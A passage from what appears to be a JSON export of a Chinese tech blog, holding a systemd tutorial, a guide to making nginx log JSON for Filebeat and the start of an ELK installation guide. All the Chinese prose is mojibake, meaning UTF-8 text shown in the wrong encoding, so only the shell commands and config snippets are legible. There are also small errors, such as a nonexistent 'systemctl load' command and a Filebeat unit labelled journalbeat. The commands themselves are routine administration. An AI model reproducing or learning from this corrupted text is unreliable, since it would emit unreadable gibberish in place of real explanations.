çš„æ¦‚å¿µï¼Œè·Ÿ Target çš„ä½œç”¨å¾ˆç±»ä¼¼ã€‚ä¸åŒçš„æ˜¯ï¼ŒRunLevel æ˜¯äº’æ–¥çš„ï¼Œä¸å¯èƒ½å¤šä¸ª RunLevel åŒæ—¶å¯åŠ¨ï¼Œä½†æ˜¯å¤šä¸ª Target å¯ä»¥åŒæ—¶å¯åŠ¨ã€‚\n\n### 3.1 target vs sysv-init\n\n- é»˜è®¤çš„ RunLevelï¼ˆåœ¨ /etc/inittab æ–‡ä»¶è®¾ç½®ï¼‰ç°åœ¨è¢«é»˜è®¤çš„ Target å–ä»£ï¼Œä½ç½®æ˜¯ /etc/systemd/system/default.targetï¼Œé€šå¸¸ç¬¦å·é“¾æ¥åˆ°graphical.targetï¼ˆå›¾å½¢ç•Œé¢ï¼‰æˆ–è€…multi-user.targetï¼ˆå¤šç”¨æˆ·å‘½ä»¤è¡Œï¼‰ã€‚\n- å¯åŠ¨è„šæœ¬çš„ä½ç½®ï¼Œä»¥å‰æ˜¯ /etc/init.d ç›®å½•ï¼Œç¬¦å·é“¾æ¥åˆ°ä¸åŒçš„ RunLevel ç›®å½• ï¼ˆæ¯”å¦‚ /etc/rc3.dã€/etc/rc5.d ç­‰ï¼‰ï¼Œç°åœ¨åˆ™å­˜æ”¾åœ¨ /lib/systemd/system å’Œ /etc/systemd/system ç›®å½•ã€‚\n- é…ç½®æ–‡ä»¶çš„ä½ç½®ï¼Œä»¥å‰ init è¿›ç¨‹çš„é…ç½®æ–‡ä»¶æ˜¯ /etc/inittabï¼Œå„ç§æœåŠ¡çš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ¨ /etc/sysconfig ç›®å½•ã€‚ç°åœ¨çš„é…ç½®æ–‡ä»¶ä¸»è¦å­˜æ”¾åœ¨ /lib/systemd ç›®å½•ï¼Œåœ¨ /etc/systemd ç›®å½•é‡Œé¢çš„ä¿®æ”¹å¯ä»¥è¦†ç›–åŸå§‹è®¾ç½®ã€‚\n\nrunlevelæ˜¯ SysV init åˆå§‹åŒ–ç³»ç»Ÿä¸­çš„æ¦‚å¿µï¼Œåœ¨Systemdåˆå§‹åŒ–ç³»ç»Ÿä¸­ä½¿ç”¨çš„æ˜¯ Targetï¼Œä»–ä»¬ä¹‹é—´çš„æ˜ å°„å…³ç³»æ˜¯\n\n| Runlevel | Target            | è¯´æ˜                               |\n| -------- | ----------------- | ---------------------------------- |\n| 0        | poweroff.target   | å…³é—­ç³»ç»Ÿ                           |\n| 1        | rescue.target     | ç»´æŠ¤æ¨¡å¼                           |\n| 2,3,4    | multi-user.target | å¤šç”¨æˆ·ï¼Œæ— å›¾å½¢ç³»ç»Ÿï¼ˆå‘½ä»¤è¡Œç•Œé¢ï¼‰   |\n| 5        | graphical.target  | å¤šç”¨æˆ·ï¼Œå›¾å½¢åŒ–ç³»ç»Ÿï¼ˆå›¾å½¢ç”¨æˆ·ç•Œé¢ï¼‰ |\n| 6        | reboot.target     | é‡å¯ç³»ç»Ÿ                           |\n\n\n\n### 3.2  target vs unit\n\nå¦‚æœä¸€ä¸ªtargetåªåŒ…å«ä¸€ä¸ªUnitï¼Œé‚£ä¹ˆè¯¥ targetï¼Œæ²¡æœ‰å¯¹åº”çš„ç›®å½•ï¼ŒæŒ‡çš„å°±æ˜¯è¿™ä¸ª Unit, ä¾‹å¦‚ `hibernate.target`åªåŒ…å« `systemd-hibernate.service`ä¸€ä¸ªUnit.\n\nå¦‚æœä¸€ä¸ªtargetåŒ…å«å¤šä¸ªUnitï¼Œé‚£ä¹ˆè¯¥targetï¼Œæœ‰å¯¹åº”çš„ xxx.target.wants ç›®å½•ï¼ŒæŒ‡çš„æ˜¯ç›®å½•é‡Œé¢æ‰€æœ‰çš„Unit, ä¾‹å¦‚`multi-user.target` åŒ…å«ä½äº`/etc/systemd/system/multi-user.target.wants`ç›®å½•ä¸‹çš„å¤šä¸ª Unit.\n\n\n\n### 3.3 target å‘½ä»¤\n\n```bash\n# æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ Target\n$ systemctl list-unit-files --type=target\n\n# æŸ¥çœ‹ä¸€ä¸ª Target åŒ…å«çš„æ‰€æœ‰ Unit\n$ systemctl list-dependencies multi-user.target\n\n# æŸ¥çœ‹å¯åŠ¨æ—¶çš„é»˜è®¤ Target\n$ systemctl get-default\n\n# è®¾ç½®å¯åŠ¨æ—¶çš„é»˜è®¤ Target\n$ sudo systemctl set-default multi-user.target\n\n# åˆ‡æ¢ Target æ—¶ï¼Œé»˜è®¤ä¸å…³é—­å‰ä¸€ä¸ª Target å¯åŠ¨çš„è¿›ç¨‹ï¼Œsystemctl isolate å‘½ä»¤æ”¹å˜è¿™ç§è¡Œä¸ºï¼Œå…³é—­å‰ä¸€ä¸ª Target é‡Œé¢æ‰€æœ‰ä¸å±äºåä¸€ä¸ª Target çš„è¿›ç¨‹\n$ sudo systemctl isolate multi-user.target\n```\n\n\n\n### 3.4 å¯åŠ¨è¿‡ç¨‹\n\n1. è¯»å…¥ `/boot` ç›®å½•ä¸‹çš„å†…æ ¸æ–‡ä»¶\n2. å†…æ ¸æ–‡ä»¶åŠ è½½å®Œä¹‹åï¼Œå¼€å§‹æ‰§è¡Œç¬¬ä¸€ä¸ªç¨‹åº`/sbin/init` åˆå§‹åŒ–è¿›ç¨‹ï¼Œç”± Systemd åˆå§‹åŒ–ç³»ç»Ÿå¼•å¯¼ï¼Œå®Œæˆç›¸å…³çš„åˆå§‹åŒ–å·¥ä½œ\n3. Systemd æ‰§è¡Œ`default.target` ï¼Œè·çŸ¥è®¾å®šçš„å¯åŠ¨ target (æŸ¥çœ‹é»˜è®¤ target: `systemctl get-default)`\n4. Systemd æ‰§è¡Œå¯åŠ¨ target å¯¹åº”çš„å•å…ƒæ–‡ä»¶ã€‚æ ¹æ®å•å…ƒæ–‡ä»¶ä¸­å®šä¹‰çš„[ä¾èµ–å…³ç³»](https://www.freedesktop.org/software/systemd/man/bootup.html#System Manager Bootup)ï¼Œä¼ é€’æ§åˆ¶æƒï¼Œä¾æ¬¡æ‰§è¡Œå…¶ä»– target å•å…ƒæ–‡ä»¶ï¼ŒåŒæ—¶å¯åŠ¨æ¯ä¸ª target åŒ…å«çš„å•å…ƒ\n\n\n\n# 4. å‘½ä»¤\n\n### 4.1 ç³»ç»Ÿç®¡ç†å‘½ä»¤\n\n`systemctl`æ˜¯ Systemd çš„ä¸»å‘½ä»¤ï¼Œç”¨äºç®¡ç†ç³»ç»Ÿã€‚\n\n```bash\n# é‡å¯ç³»ç»Ÿ\n$ sudo systemctl reboot\n\n# å…³é—­ç³»ç»Ÿï¼Œåˆ‡æ–­ç”µæº\n$ sudo systemctl poweroff\n\n# CPUåœæ­¢å·¥ä½œ\n$ sudo systemctl halt\n\n# æš‚åœç³»ç»Ÿ\n$ sudo systemctl suspend\n\n# è®©ç³»ç»Ÿè¿›å…¥å†¬çœ çŠ¶æ€\n$ sudo systemctl hibernate\n\n# è®©ç³»ç»Ÿè¿›å…¥äº¤äº’å¼ä¼‘çœ çŠ¶æ€\n$ sudo systemctl hybrid-sleep\n\n# å¯åŠ¨è¿›å…¥æ•‘æ´çŠ¶æ€ï¼ˆå•ç”¨æˆ·çŠ¶æ€ï¼‰\n$ sudo systemctl rescue\n```\n\n\n\n`systemd-analyze`å‘½ä»¤ç”¨äºæŸ¥çœ‹å¯åŠ¨è€—æ—¶ã€‚\n\n```bash\n# æŸ¥çœ‹å¯åŠ¨è€—æ—¶\n$ systemd-analyze                                                                                       \n\n# æŸ¥çœ‹æ¯ä¸ªæœåŠ¡çš„å¯åŠ¨è€—æ—¶\n$ systemd-analyze blame\n\n# æ˜¾ç¤ºç€‘å¸ƒçŠ¶çš„å¯åŠ¨è¿‡ç¨‹æµ\n$ systemd-analyze critical-chain\n\n# æ˜¾ç¤ºæŒ‡å®šæœåŠ¡çš„å¯åŠ¨æµ\n$ systemd-analyze critical-chain atd.service\n```\n\n\n\n### 4.2 æŸ¥çœ‹é…ç½®æ–‡ä»¶\n\n```bash\n# åˆ—å‡ºæ‰€æœ‰é…ç½®æ–‡ä»¶\n# è¿™ä¸ªåˆ—è¡¨æ˜¾ç¤ºæ¯ä¸ªé…ç½®æ–‡ä»¶çš„çŠ¶æ€ï¼Œä¸€å…±æœ‰å››ç§ã€‚\n# enabledï¼šå·²å»ºç«‹å¯åŠ¨é“¾æ¥\n# disabledï¼šæ²¡å»ºç«‹å¯åŠ¨é“¾æ¥\n# staticï¼šè¯¥é…ç½®æ–‡ä»¶æ²¡æœ‰[Install]éƒ¨åˆ†ï¼ˆæ— æ³•æ‰§è¡Œï¼‰ï¼Œåªèƒ½ä½œä¸ºå…¶ä»–é…ç½®æ–‡ä»¶çš„ä¾èµ–\n# maskedï¼šè¯¥é…ç½®æ–‡ä»¶è¢«ç¦æ­¢å»ºç«‹å¯åŠ¨é“¾æ¥\n$ systemctl list-unit-files\n\n# åˆ—å‡ºæŒ‡å®šç±»å‹çš„é…ç½®æ–‡ä»¶\n$ systemctl list-unit-files --type=service\n\n# æŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„æ‰€æœ‰ Target\n$ systemctl list-unit-files --type=target\n```\n\n\n\n### 4.3 æŸ¥çœ‹ç³»ç»ŸUnit\n\n```bash\n# åˆ—å‡ºæ­£åœ¨è¿è¡Œçš„ Unit\n$ systemctl list-units\n\n# åˆ—å‡ºæ‰€æœ‰Unitï¼ŒåŒ…æ‹¬æ²¡æœ‰æ‰¾åˆ°é…ç½®æ–‡ä»¶çš„æˆ–è€…å¯åŠ¨å¤±è´¥çš„\n$ systemctl list-units --all\n\n# åˆ—å‡ºæ‰€æœ‰æ²¡æœ‰è¿è¡Œçš„ Unit\n$ systemctl list-units --all --state=inactive\n\n# åˆ—å‡ºæ‰€æœ‰åŠ è½½å¤±è´¥çš„ Unit\n$ systemctl list-units --failed\n\n# åˆ—å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„ã€ç±»å‹ä¸º service çš„ Unit\n$ systemctl list-units --type=service\n\n# æŸ¥çœ‹ Unit é…ç½®æ–‡ä»¶çš„å†…å®¹\n$ systemctl cat docker.service\n```\n\n\n\n### 4.4 æŸ¥çœ‹ Unit çš„çŠ¶æ€\n\n```bash\n# æ˜¾ç¤ºç³»ç»ŸçŠ¶æ€\n$ systemctl status\n\n# æ˜¾ç¤ºå•ä¸ª Unit çš„çŠ¶æ€\n$ systemctl status bluetooth.service\n\n# æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„æŸä¸ª Unit çš„çŠ¶æ€\n$ systemctl -H root@levonfly.example.com status httpd.service\n\n# æ˜¾ç¤ºæŸä¸ª Unit æ˜¯å¦æ­£åœ¨è¿è¡Œ\n$ systemctl is-active application.service\n\n# æ˜¾ç¤ºæŸä¸ª Unit æ˜¯å¦å¤„äºå¯åŠ¨å¤±è´¥çŠ¶æ€\n$ systemctl is-failed application.service\n\n# æ˜¾ç¤ºæŸä¸ª Unit æœåŠ¡æ˜¯å¦å»ºç«‹äº†å¯åŠ¨é“¾æ¥\n$ systemctl is-enabled application.service\n```\n\n\n\n### 4.5 Unit çš„ç®¡ç†\n\n```bash\n# ç«‹å³å¯åŠ¨ä¸€ä¸ªæœåŠ¡\n$ sudo systemctl start apache.service\n\n# ç«‹å³åœæ­¢ä¸€ä¸ªæœåŠ¡\n$ sudo systemctl stop apache.service\n\n# é‡å¯ä¸€ä¸ªæœåŠ¡\n$ sudo systemctl restart apache.service\n\n# æ€æ­»ä¸€ä¸ªæœåŠ¡çš„æ‰€æœ‰å­è¿›ç¨‹\n$ sudo systemctl kill apache.service\n\n# é‡æ–°åŠ è½½ä¸€ä¸ªæœåŠ¡çš„é…ç½®æ–‡ä»¶\n$ sudo systemctl reload apache.service\n\n# é‡è½½æ‰€æœ‰ä¿®æ”¹è¿‡çš„é…ç½®æ–‡ä»¶\n$ sudo systemctl daemon-reload\n\n# æ˜¾ç¤ºæŸä¸ª Unit çš„æ‰€æœ‰åº•å±‚å‚æ•°\n$ systemctl show httpd.service\n\n# æ˜¾ç¤ºæŸä¸ª Unit çš„æŒ‡å®šå±æ€§çš„å€¼\n$ systemctl show -p CPUShares httpd.service\n\n# è®¾ç½®æŸä¸ª Unit çš„æŒ‡å®šå±æ€§\n$ sudo systemctl set-property httpd.service CPUShares=500\n```\n\n\n\n### 4.6 æŸ¥çœ‹ Unit çš„ä¾èµ–å…³ç³»\n\n```bash\n# åˆ—å‡ºä¸€ä¸ª Unit çš„æ‰€æœ‰ä¾èµ–ï¼Œé»˜è®¤ä¸ä¼šåˆ—å‡º target ç±»å‹\n$ systemctl list-dependencies nginx.service\n\n# åˆ—å‡ºä¸€ä¸ª Unit çš„æ‰€æœ‰ä¾èµ–ï¼ŒåŒ…æ‹¬ target ç±»å‹\n$ systemctl list-dependencies --all nginx.service\n```\n\n\n\n### 4.7 æœåŠ¡çš„ç”Ÿå‘½å‘¨æœŸ\n\nå½“ä¸€ä¸ªæ–°çš„ Unit æ–‡ä»¶è¢«æ”¾å…¥ /etc/systemd/system/ æˆ– /usr/lib/systemd/system/ ç›®å½•ä¸­æ—¶ï¼Œå®ƒæ˜¯ä¸ä¼šè¢«è‡ªè¯†è¯†åˆ«çš„ã€‚\n\n**æœåŠ¡çš„æ¿€æ´»**\n\n- systemctl enableï¼šåœ¨ /etc/systemd/system/ å»ºç«‹æœåŠ¡çš„ç¬¦å·é“¾æ¥ï¼ŒæŒ‡å‘ /usr/lib/systemd/system/ ä¸­\n- systemctl startï¼šä¾æ¬¡å¯åŠ¨å®šä¹‰åœ¨ Unit æ–‡ä»¶ä¸­çš„ ExecStartPreã€ExecStart å’Œ ExecStartPost å‘½ä»¤\n\n**æœåŠ¡çš„å¯åŠ¨å’Œåœæ­¢**\n\n- systemctl startï¼šä¾æ¬¡å¯åŠ¨å®šä¹‰åœ¨ Unit æ–‡ä»¶ä¸­çš„ ExecStartPreã€ExecStart å’Œ ExecStartPost å‘½ä»¤\n- systemctl stopï¼šä¾æ¬¡åœæ­¢å®šä¹‰åœ¨ Unit æ–‡ä»¶ä¸­çš„ ExecStopPreã€ExecStop å’Œ ExecStopPost å‘½ä»¤\n- systemctl restartï¼šé‡å¯æœåŠ¡\n- systemctl killï¼šç«‹å³æ€æ­»æœåŠ¡\n\n**æœåŠ¡çš„å¼€æœºå¯åŠ¨å’Œå–æ¶ˆ**\n\n- systemctl enableï¼šé™¤äº†æ¿€æ´»æœåŠ¡ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç½®æœåŠ¡ä¸ºå¼€æœºå¯åŠ¨\n- systemctl disableï¼šå–æ¶ˆæœåŠ¡çš„å¼€æœºå¯åŠ¨\n\n**æœåŠ¡çš„ä¿®æ”¹å’Œç§»é™¤**\n\n- systemctl daemon-reloadï¼šSystemd ä¼šå°† Unit æ–‡ä»¶çš„å†…å®¹å†™åˆ°ç¼“å­˜ä¸­ï¼Œå› æ­¤å½“ Unit æ–‡ä»¶è¢«æ›´æ–°æ—¶ï¼Œéœ€è¦å‘Šè¯‰ Systemd é‡æ–°è¯»å–æ‰€æœ‰çš„ Unit æ–‡ä»¶\n\n- systemctl reset-failedï¼šç§»é™¤æ ‡è®°ä¸ºä¸¢å¤±çš„ Unit æ–‡ä»¶ã€‚åœ¨åˆ é™¤ Unit æ–‡ä»¶åï¼Œç”±äºç¼“å­˜çš„å…³ç³»ï¼Œå³ä½¿é€šè¿‡ daemon-reload æ›´æ–°äº†ç¼“å­˜ï¼Œåœ¨ list-units ä¸­ä¾ç„¶ä¼šæ˜¾ç¤ºæ ‡è®°ä¸º not-found çš„ Unitã€‚\n\n  \n\n### 4.8 systemctl ä¸ service å‘½ä»¤çš„åŒºåˆ«\n\n1. systemctl èåˆäº† service å’Œ chkconfig çš„åŠŸèƒ½\n2. åœ¨ Ubuntu18.04 ä¸­æ²¡æœ‰è‡ªå¸¦ chkconfig å‘½ä»¤ï¼›service å‘½ä»¤å®é™…ä¸Šé‡å®šå‘åˆ° systemctl å‘½ä»¤\n\n| åŠ¨ä½œ                 | SysV Init æŒ‡ä»¤                 | Systemd æŒ‡ä»¤                              |\n| -------------------- | ------------------------------ | ----------------------------------------- |\n| å¯åŠ¨æŸæœåŠ¡           | service httpd start            | systemctl start httpd                     |\n| åœæ­¢æŸæœåŠ¡           | service httpd stop             | systemctl stop httpd                      |\n| é‡å¯æŸæœåŠ¡           | service httpd restart          | systemctl restart httpd                   |\n| æ£€æŸ¥æœåŠ¡çŠ¶æ€         | service httpd status           | systemctl status httpd                    |\n| åˆ é™¤æŸæœåŠ¡           | chkconfig --del httpd          | åœæ‰åº”ç”¨ï¼Œåˆ é™¤å…¶é…ç½®æ–‡ä»¶                  |\n| ä½¿æœåŠ¡å¼€æœºè‡ªå¯åŠ¨     | chkconfig --level 5 httpd on   | systemctl enable httpd                    |\n| ä½¿æœåŠ¡å¼€æœºä¸è‡ªå¯åŠ¨   | chkconfig --level 5 httpd off  | systemctl disable httpd                   |\n| æŸ¥è¯¢æœåŠ¡æ˜¯å¦å¼€æœºè‡ªå¯ | chkconfig --list \\| grep httpd | systemctl is-enabled httpd                |\n| åŠ å…¥è‡ªå®šä¹‰æœåŠ¡       | chkconfig --add test           | systemctl load test                       |\n| æ˜¾ç¤ºæ‰€æœ‰å·²å¯åŠ¨çš„æœåŠ¡ | chkconfig --list               | systemctl list-unit-files \\| grep enabled |\n\n\n\n# 5. system å·¥å…·é›†\n\n- systemctlï¼šç”¨äºæ£€æŸ¥å’Œæ§åˆ¶å„ç§ç³»ç»ŸæœåŠ¡å’Œèµ„æºçš„çŠ¶æ€\n\n- bootctlï¼šç”¨äºæŸ¥çœ‹å’Œç®¡ç†ç³»ç»Ÿå¯åŠ¨åˆ†åŒº\n\n- hostnamectlï¼šç”¨äºæŸ¥çœ‹å’Œä¿®æ”¹ç³»ç»Ÿçš„ä¸»æœºåå’Œä¸»æœºä¿¡æ¯\n\n  ```bash\n  # æ˜¾ç¤ºå½“å‰ä¸»æœºçš„ä¿¡æ¯\n  $ hostnamectl\n  \n  # è®¾ç½®ä¸»æœºåã€‚\n  $ sudo hostnamectl set-hostname levonfly\n  ```\n\n  \n\n- journalctlï¼šç”¨äºæŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—å’Œå„ç±»åº”ç”¨æœåŠ¡æ—¥å¿—\n\n- localectlï¼šç”¨äºæŸ¥çœ‹å’Œç®¡ç†ç³»ç»Ÿçš„åœ°åŒºä¿¡æ¯\n\n  ```bash\n  # æŸ¥çœ‹æœ¬åœ°åŒ–è®¾ç½®\n  $ localectl\n  \n  # è®¾ç½®æœ¬åœ°åŒ–å‚æ•°ã€‚\n  $ sudo localectl set-locale LANG=en_GB.utf8\n  $ sudo localectl set-keymap en_GB\n  ```\n\n  \n\n- loginctlï¼šç”¨äºç®¡ç†ç³»ç»Ÿå·²ç™»å½•ç”¨æˆ·å’Œ Session çš„ä¿¡æ¯\n\n  ```bash\n  # åˆ—å‡ºå½“å‰session\n  $ loginctl list-sessions\n  \n  # åˆ—å‡ºå½“å‰ç™»å½•ç”¨æˆ·\n  $ loginctl list-users\n  \n  # åˆ—å‡ºæ˜¾ç¤ºæŒ‡å®šç”¨æˆ·çš„ä¿¡æ¯\n  $ loginctl show-user ruanyf\n  ```\n\n  \n\n- machinectlï¼šç”¨äºæ“ä½œ Systemd å®¹å™¨\n\n- timedatectlï¼šç”¨äºæŸ¥çœ‹å’Œç®¡ç†ç³»ç»Ÿçš„æ—¶é—´å’Œæ—¶åŒºä¿¡æ¯\n\n  ```bash\n  # æŸ¥çœ‹å½“å‰æ—¶åŒºè®¾ç½®\n  $ timedatectl\n  \n  # æ˜¾ç¤ºæ‰€æœ‰å¯ç”¨çš„æ—¶åŒº\n  $ timedatectl list-timezones                                                                                   \n  \n  # è®¾ç½®å½“å‰æ—¶åŒº\n  $ sudo timedatectl set-timezone America/New_York\n  $ sudo timedatectl set-time YYYY-MM-DD\n  $ sudo timedatectl set-time HH:MM:SS\n  ```\n\n  \n\n- systemd-analyze æ˜¾ç¤ºæ­¤æ¬¡ç³»ç»Ÿå¯åŠ¨æ—¶è¿è¡Œæ¯ä¸ªæœåŠ¡æ‰€æ¶ˆè€—çš„æ—¶é—´ï¼Œå¯ä»¥ç”¨äºåˆ†æç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¸­çš„æ€§èƒ½ç“¶é¢ˆ\n\n- systemd-ask-passwordï¼šè¾…åŠ©æ€§å·¥å…·ï¼Œç”¨æ˜Ÿå·å±è”½ç”¨æˆ·çš„ä»»æ„è¾“å…¥ï¼Œç„¶åè¿”å›å®é™…è¾“å…¥çš„å†…å®¹\n\n- systemd-catï¼šç”¨äºå°†å…¶ä»–å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°ç³»ç»Ÿæ—¥å¿—\n\n- systemd-cglsï¼šé€’å½’åœ°æ˜¾ç¤ºæŒ‡å®š CGroup çš„ç»§æ‰¿é“¾\n\n- systemd-cgtopï¼šæ˜¾ç¤ºç³»ç»Ÿå½“å‰æœ€è€—èµ„æºçš„ CGroup å•å…ƒ\n\n- systemd-escapeï¼šè¾…åŠ©æ€§å·¥å…·ï¼Œç”¨äºå»é™¤æŒ‡å®šå­—ç¬¦ä¸²ä¸­ä¸èƒ½ä½œä¸º Unit æ–‡ä»¶åçš„å­—ç¬¦\n\n- systemd-hwdbï¼šSystemd çš„å†…éƒ¨å·¥å…·ï¼Œç”¨äºæ›´æ–°ç¡¬ä»¶æ•°æ®åº“\n\n- systemd-deltaï¼šå¯¹æ¯”å½“å‰ç³»ç»Ÿé…ç½®ä¸é»˜è®¤ç³»ç»Ÿé…ç½®çš„å·®å¼‚\n\n- systemd-detect-virtï¼šæ˜¾ç¤ºä¸»æœºçš„è™šæ‹ŸåŒ–ç±»å‹\n\n- systemd-inhibitï¼šç”¨äºå¼ºåˆ¶å»¶è¿Ÿæˆ–ç¦æ­¢ç³»ç»Ÿçš„å…³é—­ã€ç¡çœ å’Œå¾…æœºäº‹ä»¶\n\n- systemd-machine-id-setupï¼šSystemd çš„å†…éƒ¨å·¥å…·ï¼Œç”¨äºç»™ Systemd å®¹å™¨ç”Ÿæˆ ID\n\n- systemd-notifyï¼šSystemd çš„å†…éƒ¨å·¥å…·ï¼Œç”¨äºé€šçŸ¥æœåŠ¡çš„çŠ¶æ€å˜åŒ–\n\n- systemd-nspawnï¼šç”¨äºåˆ›å»º Systemd å®¹å™¨\n\n- systemd-pathï¼šSystemd çš„å†…éƒ¨å·¥å…·ï¼Œç”¨äºæ˜¾ç¤ºç³»ç»Ÿä¸Šä¸‹æ–‡ä¸­çš„å„ç§è·¯å¾„é…ç½®\n\n- systemd-runï¼šç”¨äºå°†ä»»æ„æŒ‡å®šçš„å‘½ä»¤åŒ…è£…æˆä¸€ä¸ªä¸´æ—¶çš„åå°æœåŠ¡è¿è¡Œ\n\n- systemd-stdio- bridgeï¼šSystemd çš„å†…éƒ¨ å·¥å…·ï¼Œç”¨äºå°†ç¨‹åºçš„æ ‡å‡†è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°ç³»ç»Ÿæ€»çº¿\n\n- systemd-tmpfilesï¼šSystemd çš„å†…éƒ¨å·¥å…·ï¼Œç”¨äºåˆ›å»ºå’Œç®¡ç†ä¸´æ—¶æ–‡ä»¶ç›®å½•\n\n- systemd-tty-ask-password-agentï¼šç”¨äºå“åº”åå°æœåŠ¡è¿›ç¨‹å‘å‡ºçš„è¾“å…¥å¯†ç è¯·æ±‚\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/usmile/p/13065594.html\n+ https://cloud.tencent.com/developer/article/1516125\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html\n+ http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\n+ http://www.jinbuguo.com/systemd/systemd.html","tags":["systemctl"],"categories":["å‘½ä»¤"]},{"title":"filebeatæ”¶é›†nginxçš„jsonæ ¼å¼æ—¥å¿—","url":"%2Fp%2Fe36ebda1.html","content":"\nä¸ºäº†ä¾¿äºåˆ©ç”¨ ELKæ—¥å¿—å¹³å°æ”¶é›†å±•ç¤º Nginx çš„æ—¥å¿—ï¼Œå¯ä»¥å°† Nginx çš„æ—¥å¿—æ”¹æˆ json çš„æ ¼å¼.\n\n<!-- more -->\n\n# 1. é…ç½®\n\n### 1.1 ä¿®æ”¹ nginx é…ç½®\n\nvim /etc/nginx/nginx.conf \n\n```nginx\n##æ‰“å¼€nginxé…ç½®æ–‡ä»¶æ·»åŠ è¿™äº›ä¿¡æ¯\n    log_format json '{ \"time_local\": \"$time_local\", '\n                            '\"remote_addr\": \"$remote_addr\", '\n                            '\"referer\": \"$http_referer\", '\n                            '\"request\": \"$request\", '\n                            '\"status\": $status, '\n                            '\"bytes\": $body_bytes_sent, '\n                            '\"agent\": \"$http_user_agent\", '\n                            '\"x_forwarded\": \"$http_x_forwarded_for\", '\n                            '\"up_addr\": \"$upstream_addr\",'\n                            '\"up_host\": \"$upstream_http_host\",'\n                            '\"up_resp_time\": \"$upstream_response_time\",'\n                            '\"request_time\": \"$request_time\"'\n ' }';\n \n##å†å°†æ—¥å¿—å¼•ç”¨æ”¹æˆjson\n     access_log  /var/log/nginx/access.log  json;\n```\n\n\n\n```bash\n > /var/log/nginx/access.log  # æ¸…ç©ºæ—¥å¿—\n systemctl restart nginx # é‡å¯ nginx\n```\n\né€šè¿‡æµè§ˆå™¨è®¿é—®, å¯ä»¥çœ‹åˆ° json è¾“å‡ºçš„æ—¥å¿—\n\n### 1.2 ä¿®æ”¹ filebeat é…ç½®\n\nvim /etc/filebeat/filebeat.yml\n\n```nginx\nfilebeat.inputs:\n- type: log\n  enabled: true\n  paths:\n    - /var/log/nginx/access.log\n  ##æ·»åŠ è¿™ä¸¤è¡Œä¿¡æ¯,ä½¿å…¶èƒ½è§£æjsonæ ¼å¼çš„æ—¥å¿—, å’Œ path å¯¹é½\n  json.keys_under_root: true\n  json.overwrite_keys: true\n\noutput.elasticsearch:\n  hosts: [\"localhost:9200\"]\n```\n\n\n\n### 1.3 filebeat æœåŠ¡\n\nsudo vi /lib/systemd/system/filebeat.service\n\n```\n[Unit]\nDescription=journalbeat\nAfter=network.target\n\n[Service]\nType=simple\nUser=root\nGroup=root\nRestart=no\nWorkingDirectory=/home/elasticsearch/workspace/filebeat-7.10.1-linux-x86_64/\nExecStart=/home/elasticsearch/workspace/filebeat-7.10.1-linux-x86_64/filebeat\nPrivateTmp=true\n\n[Install]\nWantedBy=multi-user.target\n```\n\nsystemctl start filebeat\n\n\n\n# 2. kinabaæŸ¥çœ‹\n\n### 2.1 åˆ›å»ºç´¢å¼•\n\n![1](filebeatæ”¶é›†nginxçš„jsonæ ¼å¼æ—¥å¿—/1.png)\n![1](filebeatæ”¶é›†nginxçš„jsonæ ¼å¼æ—¥å¿—/2.png)\n\n\n\n### 2.2 æŸ¥è¯¢\n\n![1](filebeatæ”¶é›†nginxçš„jsonæ ¼å¼æ—¥å¿—/3.png)\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://www.jianshu.com/p/b6ba259777e7\n\n","tags":["elk"],"categories":["elk"]},{"title":"elkå®‰è£…å’Œä½¿ç”¨","url":"%2Fp%2F4986eca1.html","content":"\n# 1. å®‰è£…\n\n### 1.1 å®‰è£…elasticsearch\n\n```bash\nwget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.10.1-linux-x86_64.tar.gz\ntar -xzf elasticsearch-7.10.1-linux-x86_64.tar.gz\ncd elasticsearch-7.10.1/bin\n./elasticsearch\n```\n\nMake sure Elasticsearch is up and running\n\n`curl http://127.0.0.1:9200`\n\n<!-- more -->\n\n+ ä¸ºäº†å®‰å…¨ä¸å…è®¸ root å¯åŠ¨\n\n  ```bash\n  adduser elasticsearch\n  chown -R elasticsearch:elasticsearch elasticsearch-7.10.1\n  su elasticsearch\n  ```\n\n  \n\n+ could not find java in bundled jdk at\n\n  ```bash\n  apt install default-jre\n  ```\n\n  è®¾ç½®ç¯å¢ƒå˜é‡\n\n  ```bash\n  vi /etc/default/elasticsearch\n  JAVA_HOME=/usr\n  START_DAEMON=true\n  ES_USER=elasticsearch\n  ES_GROUP=elasticsearch\n  \n  export JAVA_HOME=/usr\n  ```\n\n  \n\n### 1.2 å®‰è£…kibana\n\n```bash\nwget https://mirrors.huaweicloud.com/kibana/7.10.1/kibana-7.10.1-linux-x86_64.tar.gz\ntar xzvf kibana-7.10.1-linux-x86_64.tar.gz\ncd kibana-7.10.1-linux-x86_64/\n./bin/kibana\n```\n\n\n\n+ è®¿é—®å¤–ç½‘ ip:5601ä¸è¡Œ\n\n  ```bash\n  vi config/kibana.yml\n  #ä¿®æ”¹\n  server.host: \"0.0.0.0\"\n  ```\n\n  \n\n### 1.3 å®‰è£…filebeat\n\n```bash\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.10.1-linux-x86_64.tar.gz\ntar -zxvf filebeat-7.10.1-linux-x86_64.tar.gz\ncd filebeat-7.10.1-linux-x86_64\n```\n\n\n\næ”¶é›†æ—¥å¿—\n\n```bash\nsudo mkdir -p /opt/data/my-app1-log\n```\n\n\n\nç¼–è¾‘`/opt/data/my-app1-log/app.log`å¹¶å­˜å…¥ä»¥ä¸‹æµ‹è¯•ç¤ºä¾‹æ—¥å¿—å†…å®¹ï¼š\n\n```\n2020-10-06 11:40:36.652 INFO http-bio-10009-exec-302 - start someMethod for some params\n2020-10-06 11:40:36.652 INFO http-bio-10009-exec-302 - getUser for someField null,paramId 